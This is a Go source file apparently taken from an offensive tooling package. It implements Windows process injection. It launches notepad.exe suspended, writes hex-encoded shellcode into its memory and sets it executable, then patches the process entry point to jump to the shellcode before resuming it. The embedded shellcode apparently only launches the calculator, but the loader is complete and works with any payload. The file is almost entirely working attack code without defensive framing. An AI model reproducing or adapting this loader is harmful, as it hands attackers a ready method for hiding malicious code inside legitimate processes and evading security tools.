package injection

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateProcessWithPipe() {
	fmt.Println("Starting CreateProcessWithPipe")
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	readProcessMemory := kernel32.NewProc("ReadProcessMemory")

	// Start up all the pipes
	var stdInRead windows.Handle
	var stdInWrite windows.Handle

	windows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)

	var stdOutRead windows.Handle
	var stdOutWrite windows.Handle

	windows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)

	var stdErrRead windows.Handle
	var stdErrWrite windows.Handle

	windows.CreatePipe(&stdErrRead, &stdErrWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)

	// Create new proccess
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)

	// Allocate virtual mem with shellcode
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		fmt.Printf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
	}

	// Write allocated shellcode to processor
	writeProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	// Set exec permission on address
	oldProtect := windows.PAGE_READWRITE
	virtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	type PEB struct {
		//reserved1              [2]byte     // BYTE 0-1
		InheritedAddressSpace    byte
		ReadImageFileExecOptions byte
		BeingDebugged            byte
		reserved2                [1]byte
		// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
		// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
		// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
		// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
		// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
		// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
		// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
		// SpareBit                     : 1;   //0x0003:7
		//reserved3              [2]uintptr  // PVOID BYTE 4-8
		Mutant                 uintptr
		ImageBaseAddress       uintptr
		Ldr                    uintptr
		ProcessParameters      uintptr
		reserved4              [3]uintptr
		AtlThunkSListPtr       uintptr
		reserved5              uintptr
		reserved6              uint32
		reserved7              uintptr
		reserved8              uint32
		AtlThunkSListPtr32     uint32
		reserved9              [45]uintptr
		reserved10             [96]byte
		PostProcessInitRoutine uintptr
		reserved11             [128]byte
		reserved12             [1]uintptr
		SessionId              uint32
	}

	type PROCESS_BASIC_INFORMATION struct {
		reserved1                    uintptr
		PebBaseAddress               uintptr
		reserved2                    [2]uintptr
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessID uintptr
	}

	// Query for PEB
	var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)

	var peb PEB
	var readBytes int32

	// Read PEB
	readProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))

	type IMAGE_DOS_HEADER struct {
		Magic    uint16
		Cblp     uint16
		Cp       uint16
		Crlc     uint16
		Cparhdr  uint16
		MinAlloc uint16
		MaxAlloc uint16
		SS       uint16
		SP       uint16
		CSum     uint16
		IP       uint16
		CS       uint16
		LfaRlc   uint16
		Ovno     uint16
		Res      [4]uint16
		OEMID    uint16
		OEMInfo  uint16
		Res2     [10]uint16
		LfaNew   int32
	}

	// Get image header
	var dosHeader IMAGE_DOS_HEADER
	var readBytes2 int32

	readProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))

	// Read signature
	var Signature uint32
	var readBytes3 int32

	readProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))

	type IMAGE_FILE_HEADER struct {
		Machine              uint16
		NumberOfSections     uint16
		TimeDateStamp        uint32
		PointerToSymbolTable uint32
		NumberOfSymbols      uint32
		SizeOfOptionalHeader uint16
		Characteristics      uint16
	}

	var peHeader IMAGE_FILE_HEADER
	var readBytes4 int32

	readProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))

	type IMAGE_OPTIONAL_HEADER64 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	type IMAGE_OPTIONAL_HEADER32 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		BaseOfData                  uint32
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32
	var readBytes5 int32

	if peHeader.Machine == 34404 { // 0x8664
		readProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	}
	if peHeader.Machine == 332 { // 0x14c
		readProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	}

	var ep uintptr
	if peHeader.Machine == 34404 {
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	}
	if peHeader.Machine == 332 {
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte

	if peHeader.Machine == 34404 {
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8)
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	}
	if peHeader.Machine == 332 {
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4)
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	}

	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	// Write shellcode buffer to suspended process
	writeProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

	// Resume process to start shellcode
	windows.ResumeThread(procInfo.Thread)

	// Close all the things
	windows.CloseHandle(procInfo.Process)
	windows.CloseHandle(procInfo.Thread)
	windows.CloseHandle(stdOutWrite)
	windows.CloseHandle(stdInRead)
	windows.CloseHandle(stdErrWrite)
}
